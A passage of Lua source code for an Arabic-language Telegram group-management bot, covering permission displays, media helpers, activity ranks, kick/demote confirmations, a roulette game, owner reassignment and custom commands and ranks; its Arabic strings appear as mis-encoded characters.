send(msg.chat_id_,msg.id_,'โ๏ธูุงูู ุงููุฌููุนู')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'โ๏ธูุฌุฑุฏ ุนุถู ููุง')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'โ๏ธุงูุดุฎุต ุบูุฑ ููุฌูุฏ ููุง')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = 'โ๏ธ' else EDT = 'โ๏ธ' end
if GetInfo.result.can_delete_messages == true then DEL = 'โ๏ธ' else DEL = 'โ๏ธ' end
if GetInfo.result.can_invite_users == true then INV = 'โ๏ธ' else INV = 'โ๏ธ' end
if GetInfo.result.can_pin_messages == true then PIN = 'โ๏ธ' else PIN = 'โ๏ธ' end
if GetInfo.result.can_restrict_members == true then BAN = 'โ๏ธ' else BAN = 'โ๏ธ' end
if GetInfo.result.can_promote_members == true then VIP = 'โ๏ธ' else VIP = 'โ๏ธ' end 
send(msg.chat_id_,msg.id_,'โ๏ธุตูุงุญูุงุช '..GetCustomTitle(user_id,msg.chat_id_)..' ูู โซ โค\nโ โ โ โ โ โ โ โ โ\nโ๏ธุญุฐู ุงูุฑุณุงุฆู โซ '..DEL..'\nโ๏ธุฏุนูุฉ ุงููุณุชุฎุฏููู โซ '..INV..'\nโ๏ธุญุธุฑ ุงููุณุชุฎุฏููู โซ '..BAN..'\nโ๏ธุชุซุจูุช ุงูุฑุณุงุฆู โซ '..PIN..'\nโ๏ธุชุบููุฑ ุงููุนูููุงุช โซ '..EDT..'\nโ๏ธุงุถุงูุฉ ูุดุฑููู โซ '..VIP..'\nโ โ โ โ โ โ โ โ โ')
end
end
end
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
mfm = GetInfo.result.bio
else 
mfm = "ูุง ููุฌุฏ"
end
end
return mfm
end
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'ุฌุฏุง ุถุนูู' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ุถุนูู' 
elseif tonumber(msgs) < 500 then 
MsgText = 'ุบูุฑ ูุชูุงุนู' 
elseif tonumber(msgs) < 750 then 
MsgText = 'ูุชูุณุท' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'ูุชูุงุนู' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'ููุฉ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ููู ุงูุชูุงุนู'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'ุงุณุทูุฑุฉ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'ูุชูุงุนู ูุงุฑ' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'ูุฌุฏุญ ุฌุฏุญ' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'ุฎูุงูู' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'ุฑุจ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'ูุงูุฑ ุจุงูุชูุงุนู' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "ูุนูู ูุฑุจู" 
end 
return MsgText
end
function mfmmoned(chat_id, user_id, msg_id, text, offset, length) local tt = Devmfm:get(mustafa..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
function ChCheck(msg)
local var = true 
if Devmfm:get(mustafa.."Devmfm2") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..Devmfm:get(mustafa..'Devmfm2')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if Devmfm:get(mustafa..'mfm:textch:user') then
local textchuser = Devmfm:get(mustafa..'mfm:textch:user')
send(msg.chat_id_,msg.id_,'['..textchuser..']')
else
send(msg.chat_id_,msg.id_,"โ๏ธุนููู ุงูุงุดุชุฑุงู ูู ููุงุฉ ุงูุจูุช \nโ๏ธููุงุฉ ุงูุจูุช โซ ["..Devmfm:get(mustafa..'Devmfm3').."]")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and Devmfm:get(mustafa..'yes'..data.sender_user_id_) == 'delyes' then
Devmfm:del(mustafa..'yes'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธูุง ุงุณุชุทูุน ุทุฑุฏ โซ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุทุฑุฏู ูู ุงููุฌููุนู") 
return false
end
end,nil)  
end
if DataText == '/delno' and Devmfm:get(mustafa..'no'..data.sender_user_id_) == 'delno' then
Devmfm:del(mustafa..'yes'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงุทุฑุฏูู") 
end
if DataText == '/yesdel' and Devmfm:get(mustafa..'yesdel'..data.sender_user_id_) == 'delyes' then
Devmfm:del(mustafa..'yesdel'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'nodel'..data.sender_user_id_, 'delno')
if Devmfm:sismember(mustafa..'mfm:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'ุงููุฏุฑุงุก โข ' else Managers = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = '' end
if Devmfm:sismember(mustafa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'ุงููุทุงูู โข ' else donky = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Managers:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Admins:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:VipMem:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Cleaner:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
Devmfm:srem(mustafa..'mfm:Constructor:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุชูุฒููู ูู โซ โค\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'ุงูุนุถู' then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธููุณ ูุฏูู ุฑุชุจู ูู ุงูุจูุช") 
else 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธูุง ุงุณุชุทูุน ุชูุฒูู โซ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if Devmfm:get(mustafa.."mfm:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู") 
Devmfm:del(mustafa.."mfm:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = Devmfm:get(mustafa.."mfm:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุงููุทูุฑ ุงูุฌุฏูุฏ โซ ["..CatchName(dp.first_name_,15).."](tg://user?id="..dp.id_..")\nโ๏ธุชู ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู ุจูุฌุงุญ") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"โ๏ธุจูุงุณุทุฉ โซ ["..CatchName(dp.first_name_,15).."](tg://user?id="..dp.id_..")\nโ๏ธููุฏ ุงุตุจุญุช ุงูุช ูุทูุฑ ูุฐุง ุงูุจูุช",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
mustafa = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
Devmfm:del(mustafa.."mfm:NewDev"..data.sender_user_id_)
dofile('DEMON.lua') 
end
end
if DataText == '/nodel' and Devmfm:get(mustafa..'nodel'..data.sender_user_id_) == 'delno' then
Devmfm:del(mustafa..'yesdel'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุฒููู") 
end
if DataText == '/YesRolet' and Devmfm:get(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = Devmfm:smembers(mustafa..'mfm:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
Devmfm:del(mustafa..'mfm:ListRolet'..data.chat_id_) 
Devmfm:del(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธ*ุตุงุญุจ ุงูุญุธ* โซ ["..UserName.."]\nโ๏ธ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*")
end
if DataText == '/NoRolet' then
Devmfm:del(mustafa..'mfm:ListRolet'..data.chat_id_) 
Devmfm:del(mustafa.."mfm:NumRolet"..data.chat_id_..data.sender_user_id_) 
Devmfm:del(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธุชู ุงูุบุงุก ุงููุนุจู ูุงุนุงุฏุฉ ุงููุนุจ ุงุฑุณู ุงูุงูุนุงุจ") 
end
if DataText == '/ListRolet' then
local List = Devmfm:smembers(mustafa..'mfm:ListRolet'..data.chat_id_) 
local Text = 'โ๏ธูุงุฆูุฉ ุงูุงุนุจูู โซ โค\nโ โ โ โ โ โ โ โ โ\n' 
local Textt = 'โ โ โ โ โ โ โ โ โ\nโ๏ธุชู ุงูุชูุงู ุงูุนุฏุฏ ุงูููู ูู ุงูุช ูุณุชุนุฏ ุ'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="ูุนู",callback_data="/YesRolet"},{text="ูุง",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = msg.content_.text_ 
if text and Devmfm:get(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
Devmfm:del(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
Devmfm:del(mustafa.."Set:Cmd:Group:New"..msg.chat_id_)
Devmfm:srem(mustafa.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุงูุงูุฑ ูู ุงููุฌููุนู", 1, 'html')  
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงููุฌุฏ ุงูุฑ ุจูุฐุง ุงูุงุณู", 1, 'html')
end
Devmfm:del(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(Devmfm:get(mustafa..'mfm:NameBot') or "ุงูุดูุทุงู")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(Devmfm:get(mustafa..'mfm:NameBot') or "ุงูุดูุทุงู")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and Devmfm:get(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
Devmfm:set(mustafa.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ุงูุงูุฑ ุงูุฌุฏูุฏ", 1, 'html')
Devmfm:del(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
Devmfm:set(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and Devmfm:get(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = Devmfm:get(mustafa.."Set:Cmd:Group:New"..msg.chat_id_)
Devmfm:set(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
Devmfm:sadd(mustafa.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงูุงูุฑ", 1, 'html')
Devmfm:del(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "โ๏ธูุงุฆูุฉ ุงูุงูุงูุฑ ุงููุถุงูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
Cmds = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") โข {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "โ๏ธูุงุชูุฌุฏ ุงูุงูุฑ ูุถุงูู ูู ุงููุฌููุนู"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู" or text == "ุญุฐู ุงูุงูุงูุฑ" or text == "ูุณุญ ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
Devmfm:del(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
Devmfm:del(mustafa.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู ูู ุงููุฌููุนู", 1, 'html')
end
if text == "ุงุถู ุงูุฑ" or text == "ุงุถุงูุฉ ุงูุฑ" or text == "ุงุถุงูู ุงูุฑ" and ChCheck(msg) then
Devmfm:set(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ุงูุงูุฑ ุงููุฏูู", 1, 'html')
return false
end
if text == "ุญุฐู ุงูุฑ" or text == "ูุณุญ ุงูุฑ" and ChCheck(msg) then 
Devmfm:set(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ุงูุงูุฑ ุงูุฐู ููุช ุจุงุถุงูุชู ูุฏููุง", 1, 'html')
return false
end
end
if text == "ุงูุตูุงุญูุงุช" or text == "ุตูุงุญูุงุช" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชูุฌุฏ ุตูุงุญูุงุช ูุถุงูู", 1, 'html')
return false
end
t = "โ๏ธูุงุฆูุฉ ุงูุตูุงุญูุงุช ุงููุถุงูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
var = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." โข ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "ุญุฐู ุงูุตูุงุญูุงุช" and ChCheck(msg) or text == "ูุณุญ ุงูุตูุงุญูุงุช" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
Devmfm:del(mustafa.."Comd:New:rt:mfm:"..v..msg.chat_id_)
Devmfm:del(mustafa.."Coomds"..msg.chat_id_)
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุงูุตูุงุญูุงุช ุงููุถุงูู", 1, 'html')
end
end
if text and text:match("^ุงุถู ุตูุงุญูู (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^ุงุถู ุตูุงุญูู (.*)$")
Devmfm:set(mustafa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
Devmfm:sadd(mustafa.."Coomds"..msg.chat_id_,ComdNew)  
Devmfm:setex(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ููุน ุงูุตูุงุญูู \n{ ุนุถู โข ูููุฒ  โข ุงุฏูู  โข ูุฏูุฑ }\nโ๏ธุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, 'html')
end
if text and text:match("^ุญุฐู ุตูุงุญูู (.*)$") and ChCheck(msg) or text and text:match("^ูุณุญ ุตูุงุญูู (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^ุญุฐู ุตูุงุญูู (.*)$") or text:match("^ูุณุญ ุตูุงุญูู (.*)$")
Devmfm:del(mustafa.."Comd:New:rt:mfm:"..ComdNew..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุงูุตูุงุญูู", 1, 'html')
end
if Devmfm:get(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ", 1, 'html')
Devmfm:del(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "ูุฏูุฑ" then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู โข ูููุฒ  โข ุงุฏูู )\nโ๏ธุงุฑุณุงู ููุน ุงูุตูุงุญูู ูุฑู ุงุฎุฑู", 1, 'html')
return false
end
end
if text == "ุงุฏูู" then
if not Manager(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู โข ูููุฒ )\nโ๏ธุงุฑุณุงู ููุน ุงูุตูุงุญูู ูุฑู ุงุฎุฑู", 1, 'html')
return false
end
end
if text == "ูููุฒ" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู )\nโ๏ธุงุฑุณุงู ููุน ุงูุตูุงุญูู ูุฑู ุงุฎุฑู", 1, 'html')
return false
end
end
if text == "ูุฏูุฑ" or text == "ุงุฏูู" or text == "ูููุฒ" or text == "ุนุถู" then
local textn = Devmfm:get(mustafa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
Devmfm:set(mustafa.."Comd:New:rt:mfm:"..textn..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุถุงูุฉ ุงูุตูุงุญูู", 1, 'html')
Devmfm:del(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("ุฑูุน (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_SOOFY = text:match("ุฑูุน (.*)")
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,DEV_SOOFY) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..DEV_SOOFY..msg.chat_id_)
if mrmfm == "ูููุฒ" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SOOFY) 
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "ุงุฏูู" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SOOFY)
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "ูุฏูุฑ" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SOOFY)  
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "ุนุถู" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("ุชูุฒูู (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_SOOFY = text:match("ุชูุฒูู (.*)")
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,DEV_SOOFY) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..DEV_SOOFY..msg.chat_id_)
if mrmfm == "ูููุฒ" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "ุงุฏูู" and Admin(msg) then 
